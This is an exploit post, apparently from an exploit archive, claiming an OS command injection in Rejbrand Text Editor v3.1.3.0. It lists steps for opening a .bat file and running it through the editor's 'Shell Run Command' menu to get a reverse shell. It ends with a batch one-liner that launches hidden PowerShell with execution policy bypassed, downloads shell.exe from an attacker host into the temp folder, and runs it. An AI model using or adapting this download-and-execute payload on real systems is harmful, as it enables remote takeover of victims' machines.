---
layout: post
title: Rejbrand Text Editor v3.1.3.0 - OS Command Injection
date: 2023-09-13
category: exploit
---

# Exploit Title: Rejbrand Text Editor v3.1.3.0 - OS Command Injection
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 13.09.2023
# Vendor Homepage: https://english.rejbrand.se
# Software Link: https://english.rejbrand.se/rejbrand/applications/rteditor/rte3130.zip
# Tested Version: v3.1.3.0 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open the Rejbrand Text Editor application.
2. Create a `.bat` file containing your reverse shell command.
3. From the **File** menu, click on **Open** and select your `.bat` file.
4. In the **File** menu, click on **Shell Run Command** to execute the `.bat` file.
5. Your reverse shell should now be active, establishing a connection to your listener.

### Example of Reverse Shell Command

An example of a simple reverse shell command for a `.bat` file could look like this:

```batch
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://attacker_ip:port -OutFile %TEMP%\shell.exe; Start-Process %TEMP%\shell.exe"
